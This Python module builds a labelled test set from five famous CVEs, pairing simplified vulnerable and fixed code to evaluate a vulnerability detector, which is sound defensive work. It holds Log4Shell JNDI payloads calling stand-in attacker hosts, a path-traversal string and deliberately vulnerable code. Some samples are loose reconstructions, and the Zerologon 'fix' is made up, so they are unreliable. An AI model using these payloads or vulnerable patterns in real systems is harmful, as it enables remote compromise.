"""
Real CVE Case Studies for Vulnerability Detection Framework

This module provides real-world CVE examples for validating and demonstrating
the effectiveness of the vulnerability detection framework. All examples are
from publicly disclosed vulnerabilities with appropriate attribution.
"""

from dataclasses import dataclass
from typing import Dict, List, Optional, Any
from enum import Enum
import json
import logging


class CVESeverity(Enum):
    """CVE severity levels"""
    CRITICAL = "Critical"
    HIGH = "High"
    MEDIUM = "Medium"
    LOW = "Low"


@dataclass
class CVEExample:
    """Represents a real CVE example for testing"""
    cve_id: str
    title: str
    description: str
    severity: CVESeverity
    cvss_score: float
    vulnerability_type: str
    affected_products: List[str]
    vulnerable_code: str
    fixed_code: str
    exploitation_scenario: str
    remediation_steps: List[str]
    references: List[str]
    discovery_date: str
    disclosure_date: str
    patch_date: Optional[str] = None
    metadata: Dict[str, Any] = None


class RealCVEDatabase:
    """Database of real CVE examples for framework validation"""

    def __init__(self):
        self.cve_examples = self._load_cve_examples()
        logging.info(f"Loaded {len(self.cve_examples)} CVE examples")

    def _load_cve_examples(self) -> Dict[str, CVEExample]:
        """Load real CVE examples with vulnerable code patterns"""
        examples = {}

        # CVE-2021-44228 - Log4j Remote Code Execution
        examples["CVE-2021-44228"] = CVEExample(
            cve_id="CVE-2021-44228",
            title="Apache Log4j2 Remote Code Execution (Log4Shell)",
            description="Apache Log4j2 JNDI features do not protect against attacker controlled LDAP and other JNDI related endpoints.",
            severity=CVESeverity.CRITICAL,
            cvss_score=10.0,
            vulnerability_type="remote_code_execution",
            affected_products=["Apache Log4j 2.0-beta9 through 2.15.0"],
            vulnerable_code="""
// Vulnerable Log4j usage
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

public class VulnerableApp {
    private static final Logger logger = LogManager.getLogger(VulnerableApp.class);

    public void processUserInput(String userInput) {
        // Vulnerable: Direct logging of user input
        logger.info("User input: " + userInput);
        // Attacker payload: ${jndi:ldap://attacker.com/a}
    }
}
""",
            fixed_code="""
// Fixed version with input validation
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

public class SecureApp {
    private static final Logger logger = LogManager.getLogger(SecureApp.class);

    public void processUserInput(String userInput) {
        // Fixed: Sanitize input before logging
        String sanitizedInput = sanitizeForLogging(userInput);
        logger.info("User input: {}", sanitizedInput);
    }

    private String sanitizeForLogging(String input) {
        // Remove JNDI lookup patterns
        return input.replaceAll("\\$\\{[^}]*\\}", "[FILTERED]");
    }
}
""",
            exploitation_scenario="Attacker sends malicious input containing ${jndi:ldap://evil.com/payload} which triggers JNDI lookup and remote code execution",
            remediation_steps=[
                "Upgrade to Log4j 2.17.1 or later",
                "Set log4j2.formatMsgNoLookups=true system property",
                "Remove JndiLookup class from classpath",
                "Implement input validation and sanitization"
            ],
            references=[
                "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-44228",
                "https://logging.apache.org/log4j/2.x/security.html"
            ],
            discovery_date="2021-11-24",
            disclosure_date="2021-12-09"
        )

        # CVE-2014-0160 - Heartbleed OpenSSL Buffer Over-read
        examples["CVE-2014-0160"] = CVEExample(
            cve_id="CVE-2014-0160",
            title="OpenSSL Heartbleed Buffer Over-read",
            description="Missing bounds checking in OpenSSL heartbeat extension allows reading arbitrary memory",
            severity=CVESeverity.HIGH,
            cvss_score=7.5,
            vulnerability_type="buffer_overflow",
            affected_products=["OpenSSL 1.0.1 through 1.0.1f"],
            vulnerable_code="""
// Simplified vulnerable heartbeat implementation
int tls1_process_heartbeat(SSL *s) {
    unsigned char *p = &s->s3->rrec.data[0], *pl;
    unsigned short hbtype;
    unsigned int payload;
    unsigned int padding = 16;

    hbtype = *p++;
    n2s(p, payload);  // Read payload length from packet
    pl = p;

    if (hbtype == TLS1_HB_REQUEST) {
        unsigned char *buffer, *bp;
        int r;

        // Vulnerable: No bounds checking on payload length
        buffer = OPENSSL_malloc(1 + 2 + payload + padding);
        bp = buffer;

        *bp++ = TLS1_HB_RESPONSE;
        s2n(payload, bp);

        // Copy payload without verifying actual data length
        memcpy(bp, pl, payload);  // VULNERABILITY HERE

        r = ssl3_write_bytes(s, TLS1_RT_HEARTBEAT, buffer, 3 + payload + padding);
        OPENSSL_free(buffer);
    }

    return 0;
}
""",
            fixed_code="""
// Fixed heartbeat implementation with bounds checking
int tls1_process_heartbeat(SSL *s) {
    unsigned char *p = &s->s3->rrec.data[0], *pl;
    unsigned short hbtype;
    unsigned int payload;
    unsigned int padding = 16;
    int r;

    if (1 + 2 + 16 > s->s3->rrec.length)
        return 0; /* silently discard */

    hbtype = *p++;
    n2s(p, payload);

    if (1 + 2 + payload + 16 > s->s3->rrec.length)
        return 0; /* silently discard per RFC 6520 */

    pl = p;

    if (hbtype == TLS1_HB_REQUEST) {
        unsigned char *buffer, *bp;

        // Fixed: Proper bounds checking
        if (payload > 16384) {
            return 0;  // Reject oversized payloads
        }

        buffer = OPENSSL_malloc(1 + 2 + payload + padding);
        bp = buffer;

        *bp++ = TLS1_HB_RESPONSE;
        s2n(payload, bp);

        // Safe copy with verified bounds
        memcpy(bp, pl, payload);
        bp += payload;

        RAND_pseudo_bytes(bp, padding);

        r = ssl3_write_bytes(s, TLS1_RT_HEARTBEAT, buffer, 3 + payload + padding);
        OPENSSL_free(buffer);
    }

    return 0;
}
""",
            exploitation_scenario="Attacker sends heartbeat request with large payload field but small actual data, causing server to return memory contents",
            remediation_steps=[
                "Upgrade to OpenSSL 1.0.1g or later",
                "Recompile with -DOPENSSL_NO_HEARTBEATS",
                "Revoke and reissue SSL certificates",
                "Change private keys and passwords"
            ],
            references=[
                "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-0160",
                "https://heartbleed.com/"
            ],
            discovery_date="2014-04-01",
            disclosure_date="2014-04-07"
        )

        # CVE-2017-5638 - Apache Struts2 Remote Code Execution
        examples["CVE-2017-5638"] = CVEExample(
            cve_id="CVE-2017-5638",
            title="Apache Struts2 Remote Code Execution",
            description="Jakarta Multipart parser in Apache Struts 2 does not properly handle malformed Content-Type headers",
            severity=CVESeverity.CRITICAL,
            cvss_score=9.8,
            vulnerability_type="remote_code_execution",
            affected_products=["Apache Struts 2.3.5 through 2.3.31", "Apache Struts 2.5 through 2.5.10"],
            vulnerable_code="""
// Vulnerable Struts2 multipart parsing
public class JakartaMultiPartRequest implements MultiPartRequest {

    public void parse(HttpServletRequest request, String saveDir)
            throws IOException {
        try {
            processUpload(request, saveDir);
        } catch (FileUploadException e) {
            // Vulnerable: Error message includes unescaped Content-Type
            String errorMessage = buildErrorMessage(e, new Object[]{
                e.getMessage(),
                request.getContentType()  // VULNERABILITY: Unsanitized user input
            });

            if (!errorMessage.contains("ErrorMessage")) {
                errorMessage = LocalizedTextUtil.findText(
                    this.getClass(),
                    "struts.messages.upload.error.general",
                    Locale.getDefault(),
                    errorMessage,
                    new Object[]{e.getMessage(), request.getContentType()}
                );
            }

            // This error message gets processed by OGNL expression parser
            addActionError(errorMessage);  // RCE happens here
        }
    }

    protected String buildErrorMessage(Throwable e, Object[] args) {
        // Error message construction allows OGNL injection
        return LocalizedTextUtil.findText(
            this.getClass(),
            "upload.error",
            Locale.getDefault(),
            e.getMessage(),
            args
        );
    }
}
""",
            fixed_code="""
// Fixed Struts2 multipart parsing with input sanitization
public class SecureJakartaMultiPartRequest implements MultiPartRequest {

    public void parse(HttpServletRequest request, String saveDir)
            throws IOException {
        try {
            processUpload(request, saveDir);
        } catch (FileUploadException e) {
            // Fixed: Sanitize Content-Type before using in error message
            String sanitizedContentType = sanitizeContentType(request.getContentType());

            String errorMessage = buildErrorMessage(e, new Object[]{
                e.getMessage(),
                sanitizedContentType  // Safe sanitized input
            });

            addActionError(errorMessage);
        }
    }

    private String sanitizeContentType(String contentType) {
        if (contentType == null) {
            return "unknown";
        }

        // Remove any OGNL expression patterns
        String sanitized = contentType.replaceAll("[#$%{}]", "");

        // Limit length to prevent abuse
        if (sanitized.length() > 100) {
            sanitized = sanitized.substring(0, 100);
        }

        return sanitized;
    }

    protected String buildErrorMessage(Throwable e, Object[] args) {
        // Use parameterized messages to prevent injection
        return MessageFormat.format(
            "Upload error: {0}. Content type: {1}",
            args
        );
    }
}
""",
            exploitation_scenario="Attacker sends multipart request with malicious Content-Type header containing OGNL expressions for remote code execution",
            remediation_steps=[
                "Upgrade to Struts 2.3.32 or 2.5.10.1 or later",
                "Implement Content-Type validation and sanitization",
                "Deploy web application firewall rules",
                "Monitor for suspicious Content-Type headers"
            ],
            references=[
                "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-5638",
                "https://struts.apache.org/docs/s2-045.html"
            ],
            discovery_date="2017-03-06",
            disclosure_date="2017-03-07"
        )

        # CVE-2019-19781 - Citrix ADC Directory Traversal
        examples["CVE-2019-19781"] = CVEExample(
            cve_id="CVE-2019-19781",
            title="Citrix Application Delivery Controller Directory Traversal",
            description="Directory traversal vulnerability in Citrix ADC and Gateway allows unauthenticated remote code execution",
            severity=CVESeverity.CRITICAL,
            cvss_score=9.8,
            vulnerability_type="path_traversal",
            affected_products=["Citrix ADC and Citrix Gateway versions 13.0, 12.1, 12.0, 11.1"],
            vulnerable_code="""
# Vulnerable Perl script in Citrix ADC
#!/usr/bin/perl

use CGI;
use strict;

my $cgi = new CGI;
my $template = $cgi->param('template');
my $action = $cgi->param('action');

if ($action eq 'render') {
    # Vulnerable: No path validation or sanitization
    my $template_path = "/netscaler/portal/templates/" . $template;

    # Directory traversal vulnerability
    if (open(FILE, "<$template_path")) {  # VULNERABILITY HERE
        my $content = "";
        while (<FILE>) {
            $content .= $_;
        }
        close(FILE);

        # Execute template (potential RCE)
        eval($content);  # Additional vulnerability

        print $cgi->header();
        print $content;
    } else {
        print $cgi->header();
        print "Template not found";
    }
}
""",
            fixed_code="""
#!/usr/bin/perl

use CGI;
use strict;
use File::Basename;
use File::Spec;

my $cgi = new CGI;
my $template = $cgi->param('template');
my $action = $cgi->param('action');

# Whitelist of allowed templates
my @allowed_templates = ('login.html', 'portal.html', 'error.html');

if ($action eq 'render') {
    # Fixed: Validate template parameter
    if (!defined($template) || $template eq '') {
        print $cgi->header(-status => 400);
        print "Bad Request: Missing template parameter";
        exit;
    }

    # Sanitize template name
    $template = basename($template);  # Remove path components
    $template =~ s/[^a-zA-Z0-9._-]//g;  # Remove dangerous characters

    # Check against whitelist
    unless (grep { $_ eq $template } @allowed_templates) {
        print $cgi->header(-status => 403);
        print "Forbidden: Invalid template";
        exit;
    }

    # Safely construct path
    my $template_path = File::Spec->catfile("/netscaler/portal/templates", $template);

    # Additional security: Verify path is within allowed directory
    my $real_path = Cwd::realpath($template_path);
    unless ($real_path && $real_path =~ /^\/netscaler\/portal\/templates\//) {
        print $cgi->header(-status => 403);
        print "Forbidden: Path traversal detected";
        exit;
    }

    if (open(FILE, "<", $template_path)) {
        my $content = "";
        while (<FILE>) {
            $content .= $_;
        }
        close(FILE);

        # Safe: No code execution, just serve static content
        print $cgi->header(-type => 'text/html');
        print $content;
    } else {
        print $cgi->header(-status => 404);
        print "Template not found";
    }
}
""",
            exploitation_scenario="Attacker uses directory traversal in template parameter (../../../etc/passwd) to read arbitrary files or execute code",
            remediation_steps=[
                "Apply vendor security patches immediately",
                "Implement input validation and path sanitization",
                "Use file access whitelisting",
                "Deploy network segmentation",
                "Monitor for exploitation attempts"
            ],
            references=[
                "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-19781",
                "https://support.citrix.com/article/CTX267027"
            ],
            discovery_date="2019-12-17",
            disclosure_date="2019-12-17"
        )

        # CVE-2020-1472 - Zerologon Netlogon Elevation of Privilege
        examples["CVE-2020-1472"] = CVEExample(
            cve_id="CVE-2020-1472",
            title="Windows Netlogon Elevation of Privilege (Zerologon)",
            description="Elevation of privilege vulnerability in Windows Netlogon protocol due to improper cryptographic validation",
            severity=CVESeverity.CRITICAL,
            cvss_score=10.0,
            vulnerability_type="privilege_escalation",
            affected_products=["Windows Server 2008 R2 through 2019"],
            vulnerable_code="""
// Simplified vulnerable Netlogon authentication (C pseudocode)
typedef struct _NETLOGON_CREDENTIAL {
    CHAR data[8];
} NETLOGON_CREDENTIAL;

NTSTATUS ComputeNetlogonCredential(
    PNETLOGON_CREDENTIAL inputCredential,
    PNETLOGON_SESSION_KEY sessionKey,
    PNETLOGON_CREDENTIAL outputCredential
) {
    BYTE zeros[8] = {0, 0, 0, 0, 0, 0, 0, 0};

    // Vulnerable: AES-CFB8 with all-zero IV
    AESCrypt(
        inputCredential->data,
        sessionKey->data,
        zeros,  // VULNERABILITY: All-zero IV
        outputCredential->data,
        8,
        AES_CFB8_MODE
    );

    // With 1/256 probability, this produces all-zero output
    // when input is all-zero, allowing authentication bypass

    return STATUS_SUCCESS;
}

NTSTATUS NetrServerAuthenticate3(
    LPWSTR PrimaryName,
    LPWSTR AccountName,
    NETLOGON_SECURE_CHANNEL_TYPE AccountType,
    LPWSTR ComputerName,
    PNETLOGON_CREDENTIAL ClientCredential,
    PNETLOGON_CREDENTIAL ServerCredential,
    PULONG NegotiateFlags,
    PULONG AccountRid
) {
    NETLOGON_CREDENTIAL computedCredential;

    // Vulnerable validation
    ComputeNetlogonCredential(
        ClientCredential,
        &gSessionKey,
        &computedCredential
    );

    // If ClientCredential is all zeros and sessionKey produces
    // zero output, authentication succeeds inappropriately
    if (memcmp(&computedCredential, &gExpectedCredential, 8) == 0) {
        return STATUS_SUCCESS;  // VULNERABILITY: Weak validation
    }

    return STATUS_ACCESS_DENIED;
}
""",
            fixed_code="""
// Fixed Netlogon authentication with proper validation
NTSTATUS ComputeNetlogonCredential(
    PNETLOGON_CREDENTIAL inputCredential,
    PNETLOGON_SESSION_KEY sessionKey,
    PNETLOGON_CREDENTIAL outputCredential
) {
    BYTE randomIV[16];

    // Fixed: Use proper random IV
    if (!CryptGenRandom(hCryptProv, sizeof(randomIV), randomIV)) {
        return STATUS_UNSUCCESSFUL;
    }

    // Use AES-GCM instead of CFB8 for better security
    NTSTATUS status = AESGCMEncrypt(
        inputCredential->data,
        sessionKey->data,
        randomIV,
        outputCredential->data,
        8
    );

    return status;
}

NTSTATUS NetrServerAuthenticate3(
    LPWSTR PrimaryName,
    LPWSTR AccountName,
    NETLOGON_SECURE_CHANNEL_TYPE AccountType,
    LPWSTR ComputerName,
    PNETLOGON_CREDENTIAL ClientCredential,
    PNETLOGON_CREDENTIAL ServerCredential,
    PULONG NegotiateFlags,
    PULONG AccountRid
) {
    NETLOGON_CREDENTIAL computedCredential;
    BYTE zeros[8] = {0};

    // Fixed: Reject all-zero credentials
    if (memcmp(ClientCredential->data, zeros, 8) == 0) {
        LogSecurityEvent(L"Zerologon attack attempt detected");
        return STATUS_ACCESS_DENIED;
    }

    // Additional entropy validation
    if (!ValidateCredentialEntropy(ClientCredential)) {
        return STATUS_ACCESS_DENIED;
    }

    NTSTATUS status = ComputeNetlogonCredential(
        ClientCredential,
        &gSessionKey,
        &computedCredential
    );

    if (!NT_SUCCESS(status)) {
        return status;
    }

    // Secure comparison with timing attack protection
    if (SecureMemoryCompare(&computedCredential, &gExpectedCredential, 8)) {
        // Additional validation steps
        if (ValidateAccountPermissions(AccountName, ComputerName)) {
            return STATUS_SUCCESS;
        }
    }

    return STATUS_ACCESS_DENIED;
}
""",
            exploitation_scenario="Attacker sends Netlogon authentication requests with all-zero credentials until successful due to cryptographic weakness",
            remediation_steps=[
                "Install KB4567487 and related security updates",
                "Enable enforcement mode after testing",
                "Monitor for Zerologon exploitation attempts",
                "Review domain controller logs",
                "Reset machine account passwords"
            ],
            references=[
                "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-1472",
                "https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2020-1472"
            ],
            discovery_date="2020-09-08",
            disclosure_date="2020-09-08"
        )

        return examples

    def get_cve_by_id(self, cve_id: str) -> Optional[CVEExample]:
        """Get CVE example by ID"""
        return self.cve_examples.get(cve_id)

    def get_cves_by_type(self, vulnerability_type: str) -> List[CVEExample]:
        """Get CVEs by vulnerability type"""
        return [cve for cve in self.cve_examples.values()
                if cve.vulnerability_type == vulnerability_type]

    def get_cves_by_severity(self, severity: CVESeverity) -> List[CVEExample]:
        """Get CVEs by severity level"""
        return [cve for cve in self.cve_examples.values()
                if cve.severity == severity]

    def get_all_cves(self) -> List[CVEExample]:
        """Get all CVE examples"""
        return list(self.cve_examples.values())

    def generate_test_dataset(self) -> List[Dict[str, Any]]:
        """Generate test dataset from CVE examples"""
        test_data = []

        for cve in self.cve_examples.values():
            # Vulnerable code sample
            test_data.append({
                'id': f"{cve.cve_id}_vulnerable",
                'code': cve.vulnerable_code,
                'label': 1,  # Vulnerable
                'vulnerability_type': cve.vulnerability_type,
                'severity': cve.severity.value,
                'cve_id': cve.cve_id,
                'metadata': {
                    'title': cve.title,
                    'cvss_score': cve.cvss_score,
                    'description': cve.description
                }
            })

            # Fixed code sample
            test_data.append({
                'id': f"{cve.cve_id}_fixed",
                'code': cve.fixed_code,
                'label': 0,  # Not vulnerable
                'vulnerability_type': 'none',
                'severity': 'None',
                'cve_id': cve.cve_id,
                'metadata': {
                    'title': f"{cve.title} (Fixed)",
                    'original_cve': cve.cve_id,
                    'remediation': cve.remediation_steps
                }
            })

        return test_data

    def create_evaluation_report(self, detector_results: Dict[str, Any]) -> str:
        """Create evaluation report comparing detection results with known CVEs"""
        report = []
        report.append("CVE-Based Evaluation Report")
        report.append("=" * 50)

        total_cves = len(self.cve_examples)
        detected_vulnerabilities = 0
        correctly_identified = 0
        false_positives = 0

        for cve_id, cve in self.cve_examples.items():
            if cve_id in detector_results:
                result = detector_results[cve_id]

                if result.get('vulnerability_detected', False):
                    detected_vulnerabilities += 1

                    # Check if vulnerability type is correctly identified
                    detected_type = result.get('vulnerability_type', 'unknown')
                    if detected_type == cve.vulnerability_type:
                        correctly_identified += 1

                    report.append(f"\n✅ {cve_id}: DETECTED")
                    report.append(f"   Expected: {cve.vulnerability_type}")
                    report.append(f"   Detected: {detected_type}")
                    report.append(f"   Confidence: {result.get('confidence', 0):.3f}")
                else:
                    report.append(f"\n❌ {cve_id}: MISSED")
                    report.append(f"   Expected: {cve.vulnerability_type}")
                    report.append(f"   Severity: {cve.severity.value}")
            else:
                report.append(f"\n⚠️  {cve_id}: NOT TESTED")

        # Calculate metrics
        detection_rate = detected_vulnerabilities / total_cves if total_cves > 0 else 0
        accuracy_rate = correctly_identified / detected_vulnerabilities if detected_vulnerabilities > 0 else 0

        report.append(f"\n{'='*50}")
        report.append("EVALUATION SUMMARY")
        report.append(f"{'='*50}")
        report.append(f"Total CVEs: {total_cves}")
        report.append(f"Detected: {detected_vulnerabilities}")
        report.append(f"Correctly Identified: {correctly_identified}")
        report.append(f"Detection Rate: {detection_rate:.2%}")
        report.append(f"Type Accuracy: {accuracy_rate:.2%}")

        return "\n".join(report)

    def export_to_json(self, filename: str):
        """Export CVE database to JSON file"""
        data = {}
        for cve_id, cve in self.cve_examples.items():
            data[cve_id] = {
                'cve_id': cve.cve_id,
                'title': cve.title,
                'description': cve.description,
                'severity': cve.severity.value,
                'cvss_score': cve.cvss_score,
                'vulnerability_type': cve.vulnerability_type,
                'affected_products': cve.affected_products,
                'vulnerable_code': cve.vulnerable_code,
                'fixed_code': cve.fixed_code,
                'exploitation_scenario': cve.exploitation_scenario,
                'remediation_steps': cve.remediation_steps,
                'references': cve.references,
                'discovery_date': cve.discovery_date,
                'disclosure_date': cve.disclosure_date,
                'patch_date': cve.patch_date
            }

        with open(filename, 'w') as f:
            json.dump(data, f, indent=2)

        logging.info(f"CVE database exported to {filename}")


# Example usage and testing
if __name__ == "__main__":
    # Initialize CVE database
    cve_db = RealCVEDatabase()

    # Print summary
    print("Real CVE Database Summary")
    print("=" * 40)
    print(f"Total CVEs: {len(cve_db.get_all_cves())}")

    # Group by severity
    for severity in CVESeverity:
        cves = cve_db.get_cves_by_severity(severity)
        print(f"{severity.value}: {len(cves)}")

    # Print details of one CVE
    log4j_cve = cve_db.get_cve_by_id("CVE-2021-44228")
    if log4j_cve:
        print(f"\nExample CVE: {log4j_cve.title}")
        print(f"Severity: {log4j_cve.severity.value}")
        print(f"CVSS: {log4j_cve.cvss_score}")
        print(f"Type: {log4j_cve.vulnerability_type}")
        print(f"Vulnerable code length: {len(log4j_cve.vulnerable_code)} characters")

    # Generate test dataset
    test_dataset = cve_db.generate_test_dataset()
    print(f"\nGenerated test dataset with {len(test_dataset)} samples")

    # Export to JSON
    cve_db.export_to_json("cve_database.json")
    print("CVE database exported to cve_database.json")